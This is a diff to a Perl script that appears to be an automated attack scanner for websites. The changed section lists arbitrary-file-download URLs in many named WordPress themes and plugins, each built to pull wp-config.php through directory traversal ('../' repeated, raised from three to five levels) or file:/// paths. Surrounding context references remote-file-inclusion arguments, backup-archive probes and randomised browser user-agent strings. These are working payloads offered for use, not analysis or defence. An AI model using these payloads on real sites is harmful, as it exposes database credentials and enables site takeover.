@@ -401,31 +401,37 @@ for my $RFIargs(@RFIargs) {
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 #ADF WP WORDPRESS
-my @ADFWP=("/wp-admin/admin-ajax.php?action=revslider_show_image&img=repeat(../-3)wp-config.php",
-"/wp-content/themes/ypo-theme/download.php?download=repeat(../-3)wp-config.php",
-"/wp-content/force-download.php?file=repeat(../-3)wp-config.php",
-"/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=repeat(../-3)wp-config.php&file_size=10",
+my @ADFWPargs=("/wp-admin/admin-ajax.php?action=revslider_show_image&img=WP1",
+"/wp-content/themes/ypo-theme/download.php?download=WP1",
+"/wp-content/force-download.php?file=WP1",
+"/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=WP1",
 "/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php",
-"/wp-content/themes/SMWF/inc/download.php?file=repeat(../-3)wp-config.php",
-"/wp-content/themes/markant/download.php?file=repeat(../-3)wp-config.php",
-"/wp-content/themes/yakimabait/download.php?file=repeat(../-3)wp-config.php",
-"/wp-content/themes/TheLoft/download.php?file=repeat(../-3)wp-config.php",
-"/wp-content/themes/felis/download.php?file=repeat(../-3)wp-config.php",
-"/wp-content/themes/MichaelCanthony/download.php?file=repeat(../-3)wp-config.php",
-"/wp-content/themes/trinity/lib/scripts/download.php?file=repeat(../-3)wp-config.php",
+"/wp-content/themes/SMWF/inc/download.php?file=WP1",
+"/wp-content/themes/markant/download.php?file=WP1",
+"/wp-content/themes/yakimabait/download.php?file=WP1",
+"/wp-content/themes/TheLoft/download.php?file=WP1",
+"/wp-content/themes/felis/download.php?file=WP1",
+"/wp-content/themes/MichaelCanthony/download.php?file=WP1",
+"/wp-content/themes/trinity/lib/scripts/download.php?file=WP1",
 "/wp-content/themes/epic/includes/download.php?file=wp-config.php",
-"/wp-content/themes/urbancity/lib/scripts/download.php?file=repeat(../-3)wp-config.php",
-"/wp-content/themes/antioch/lib/scripts/download.php?file=repeat(../-3)wp-config.php",
-"/wp-content/themes/authentic/includes/download.php?file=repeat(../-3)wp-config.php",
-"/wp-content/themes/churchope/lib/downloadlink.php?file=repeat(../-3)wp-config.php",
-"/wp-content/themes/lote27/download.php?download=repeat(../-3)wp-config.php",
-"/wp-content/themes/linenity/functions/download.php?imgurl=repeat(../-3)wp-config.php",
-"/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=repeat(../-3)wp-config.php",
+"/wp-content/themes/urbancity/lib/scripts/download.php?file=WP1",
+"/wp-content/themes/antioch/lib/scripts/download.php?file=WP1",
+"/wp-content/themes/authentic/includes/download.php?file=WP1",
+"/wp-content/themes/churchope/lib/downloadlink.php?file=WP1",
+"/wp-content/themes/lote27/download.php?download=WP1",
+"/wp-content/themes/linenity/functions/download.php?imgurl=WP1",
+"/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=WP1",
 "/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/wamp/www/wp-config.php",
 "/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/xampp/htdocs/wp-config.php",
 "/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php",
-"/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=repeat(../-3)wp-config.php",
-"/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=repeat(../-3)wp-config.php");
+"/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=WP1",
+"/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=WP1");
+############################################################################################################################################################################################
+my @ADFWP;
+for my $ADFWPargs(@ADFWPargs) {
+  if ($ADFWPargs=~/WP1/) { $ADFWPargs=~s/WP1/repeat(..\/-5)wp-config.php/; }
+  push @ADFWP, $ADFWPargs;
+}
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## ADMIN PAGE
@@ -453,8 +459,7 @@ my @ZIP=("/backup.tar.gz", "/backup/backup.tar.gz", "/backup/backup.zip", "/vb/b
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## SYSTEM RANDOM
-my @sys=(
-"",
+my @sys=("",
 "compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; $strings[rand @strings]",
 "compatible; MSIE 7.0; Windows NT 5.1; $strings[rand @strings]",
 "compatible; MSIE 6.0; Windows NT 5.1; $strings[rand @strings]",
